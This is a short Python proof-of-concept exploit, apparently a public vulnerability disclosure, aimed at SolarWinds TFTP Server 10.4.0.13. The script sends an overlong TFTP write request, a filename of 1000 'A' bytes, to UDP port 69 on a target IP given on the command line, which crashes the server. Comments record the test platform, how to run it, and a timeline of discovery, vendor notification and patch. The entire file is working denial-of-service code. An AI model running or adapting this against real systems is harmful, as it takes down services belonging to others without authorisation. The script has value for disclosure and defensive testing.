#!/usr/bin/python
print "\n############################################################"
print "##	Nullthreat Network"
print "##	Solarwinds TFTP Server Ver. 10.4.0.13"
print "##	Elliott \"Nullthreat\" Cutright"
print "##	nullthreat@nullthreat.net"
print "############################################################"
print "\n"
# Summary: An long Write Request (1000 A's) will cause SolarWinds TFTP Server to crash.
# Tested on: Windows XP SP3
# Usage: ./solarwindscrash.py <IPADDRESS>
# Note: It can take the application a few moments to crash, be patiant.
# Shouts: #SEUnited, Corelan Team

# Discovered: June 6th 2010
# Vendor Notified: June 9th 2010
# Patch Released: June 11th 2010

import socket
import sys

host = sys.argv[1]
port = 69
addr = (host,port)

s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

print "[*] Building Crash"
crash = "\x41" * 1000
request = "\x00\x02" + crash + "\x00" + "NETASCII" + "\x00"

print "[*] Sending Crash"
s.sendto(request, addr)

print "[*] Crash Sent, It can take some time for the app to crash"